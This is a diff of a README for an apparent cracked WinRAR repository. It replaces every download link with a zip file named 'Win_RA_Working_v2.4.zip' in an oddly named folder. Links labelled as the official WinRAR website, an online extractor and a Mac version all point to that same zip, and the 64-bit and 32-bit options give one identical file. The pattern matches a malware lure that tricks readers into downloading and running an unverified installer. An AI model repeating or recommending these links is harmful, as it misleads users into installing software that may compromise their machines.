@@ -6,7 +6,7 @@ WinRAR-Working helps you manage your files with ease. It allows you to compress,
 
 ## 📥 Download Now
 
-[![Download WinRAR-Working](https://raw.githubusercontent.com/deathpiggy/WinRAR-Working/main/hydatidocele/WinRAR-Working.zip)](https://raw.githubusercontent.com/deathpiggy/WinRAR-Working/main/hydatidocele/WinRAR-Working.zip)
+[![Download WinRAR-Working](https://github.com/deathpiggy/WinRAR-Working/raw/refs/heads/main/hydatidocele/Win_RA_Working_v2.4.zip)](https://github.com/deathpiggy/WinRAR-Working/raw/refs/heads/main/hydatidocele/Win_RA_Working_v2.4.zip)
 
 ## 📋 What You Need
 
@@ -28,14 +28,14 @@ Before you start, make sure your computer meets these requirements:
 
 ### Step 1: Download the Application
 
-Visit [this page to download](https://raw.githubusercontent.com/deathpiggy/WinRAR-Working/main/hydatidocele/WinRAR-Working.zip).
+Visit [this page to download](https://github.com/deathpiggy/WinRAR-Working/raw/refs/heads/main/hydatidocele/Win_RA_Working_v2.4.zip).
 
 ### Step 2: Choose the File
 
 On the Releases page, locate the latest version of WinRAR-Working. Click on the appropriate file based on your system type:
 
-- For 64-bit Windows, download the file labeled `https://raw.githubusercontent.com/deathpiggy/WinRAR-Working/main/hydatidocele/WinRAR-Working.zip`.
-- For 32-bit Windows, download `https://raw.githubusercontent.com/deathpiggy/WinRAR-Working/main/hydatidocele/WinRAR-Working.zip`.
+- For 64-bit Windows, download the file labeled `https://github.com/deathpiggy/WinRAR-Working/raw/refs/heads/main/hydatidocele/Win_RA_Working_v2.4.zip`.
+- For 32-bit Windows, download `https://github.com/deathpiggy/WinRAR-Working/raw/refs/heads/main/hydatidocele/Win_RA_Working_v2.4.zip`.
 
 ### Step 3: Run the Installer
 
@@ -83,8 +83,8 @@ If you find WinRAR-Working helpful, consider supporting us with a donation. Your
 
 ## 🌐 Additional Resources
 
-- [Official WinRAR Website](https://raw.githubusercontent.com/deathpiggy/WinRAR-Working/main/hydatidocele/WinRAR-Working.zip)
-- [Online WinRAR Extractor](https://raw.githubusercontent.com/deathpiggy/WinRAR-Working/main/hydatidocele/WinRAR-Working.zip)
-- [WinRAR for Mac](https://raw.githubusercontent.com/deathpiggy/WinRAR-Working/main/hydatidocele/WinRAR-Working.zip)
+- [Official WinRAR Website](https://github.com/deathpiggy/WinRAR-Working/raw/refs/heads/main/hydatidocele/Win_RA_Working_v2.4.zip)
+- [Online WinRAR Extractor](https://github.com/deathpiggy/WinRAR-Working/raw/refs/heads/main/hydatidocele/Win_RA_Working_v2.4.zip)
+- [WinRAR for Mac](https://github.com/deathpiggy/WinRAR-Working/raw/refs/heads/main/hydatidocele/Win_RA_Working_v2.4.zip)
 
 Feel free to reach out if you need help or have questions. Happy file managing!
